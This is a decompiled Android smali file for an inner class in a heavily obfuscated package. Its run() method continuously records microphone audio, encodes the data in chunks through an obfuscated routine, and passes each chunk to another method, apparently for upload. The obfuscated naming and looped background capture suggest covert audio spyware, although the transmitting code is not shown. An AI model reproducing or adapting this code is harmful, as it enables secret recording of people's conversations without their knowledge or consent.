.class Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->e(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Ljava/lang/String;

.field final synthetic f:Ljava/lang/String;

.field final synthetic g:Landroid/content/Context;


# direct methods
.method constructor <init>(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->e:Ljava/lang/String;

    iput-object p2, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->f:Ljava/lang/String;

    iput-object p3, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->g:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 13

    const/4 v0, 0x1

    :try_start_0
    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->a:Z

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/4 v2, 0x0

    const/4 v3, 0x0

    :try_start_1
    iget-object v4, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->e:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    iget-object v5, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->f:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5

    sget v6, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->e:I

    sget v7, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->f:I

    invoke-static {v5, v6, v7}, Landroid/media/AudioRecord;->getMinBufferSize(III)I

    move-result v6

    new-array v7, v6, [B

    iget-object v8, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->g:Landroid/content/Context;

    invoke-static {v4, v5, v3, v6, v8}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->m(IILandroid/media/AudioRecord;ILandroid/content/Context;)Landroid/media/AudioRecord;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_2
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    if-nez v3, :cond_1

    if-eqz v3, :cond_0

    :try_start_2
    invoke-virtual {v3}, Landroid/media/AudioRecord;->stop()V

    invoke-virtual {v3}, Landroid/media/AudioRecord;->release()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    goto/16 :goto_9

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_4
    invoke-static {v4}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->h(I)I

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->j(I)I

    new-instance v8, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v8}, Ljava/io/ByteArrayOutputStream;-><init>()V

    mul-int/lit8 v9, v6, 0x14

    move v10, v2

    :goto_1
    sget-boolean v11, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->a:Z

    if-eqz v11, :cond_5

    const-class v11, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;

    monitor-enter v11
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_2
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    :try_start_5
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->g()I

    move-result v12

    if-ne v12, v4, :cond_2

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->i()I

    move-result v12

    if-eq v12, v5, :cond_3

    goto :goto_2

    :catchall_0
    move-exception v0

    goto :goto_3

    :cond_2
    :goto_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->g()I

    move-result v4

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->i()I

    move-result v5

    iget-object v12, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->g:Landroid/content/Context;

    invoke-static {v4, v5, v3, v6, v12}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->m(IILandroid/media/AudioRecord;ILandroid/content/Context;)Landroid/media/AudioRecord;

    move-result-object v3

    :cond_3
    invoke-virtual {v3, v7, v2, v6}, Landroid/media/AudioRecord;->read([BII)I

    invoke-virtual {v1, v7, v2, v6}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->k()Z

    move-result v12

    if-nez v12, :cond_4

    invoke-virtual {v8, v7, v2, v6}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    add-int/2addr v10, v6

    if-lt v10, v9, :cond_4

    invoke-virtual {v8}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v10

    const/16 v12, 0x10

    invoke-static {v10, v5, v0, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/t5;->a([BIII)[B

    move-result-object v10

    iget-object v12, p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;->g:Landroid/content/Context;

    invoke-static {v12, v10}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->l(Landroid/content/Context;[B)V

    invoke-virtual {v8}, Ljava/io/ByteArrayOutputStream;->reset()V

    move v10, v2

    :cond_4
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->reset()V

    monitor-exit v11

    goto :goto_1

    :goto_3
    monitor-exit v11
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :try_start_6
    throw v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    :catchall_1
    move-exception v0

    goto :goto_7

    :catch_2
    move-exception v0

    goto :goto_5

    :catch_3
    move-exception v0

    goto :goto_5

    :cond_5
    :try_start_7
    invoke-virtual {v3}, Landroid/media/AudioRecord;->stop()V

    invoke-virtual {v3}, Landroid/media/AudioRecord;->release()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_6

    :catch_4
    move-exception v0

    :goto_4
    :try_start_8
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    goto :goto_6

    :goto_5
    :try_start_9
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->a:Z
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_1

    if-eqz v3, :cond_6

    :try_start_a
    invoke-virtual {v3}, Landroid/media/AudioRecord;->stop()V

    invoke-virtual {v3}, Landroid/media/AudioRecord;->release()V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    goto :goto_6

    :catch_5
    move-exception v0

    goto :goto_4

    :cond_6
    :goto_6
    :try_start_b
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_1

    goto :goto_a

    :goto_7
    if-eqz v3, :cond_7

    :try_start_c
    invoke-virtual {v3}, Landroid/media/AudioRecord;->stop()V

    invoke-virtual {v3}, Landroid/media/AudioRecord;->release()V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_6

    goto :goto_8

    :catch_6
    move-exception v1

    :try_start_d
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_7
    :goto_8
    throw v0
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_1

    :goto_9
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_a
    return-void
.end method
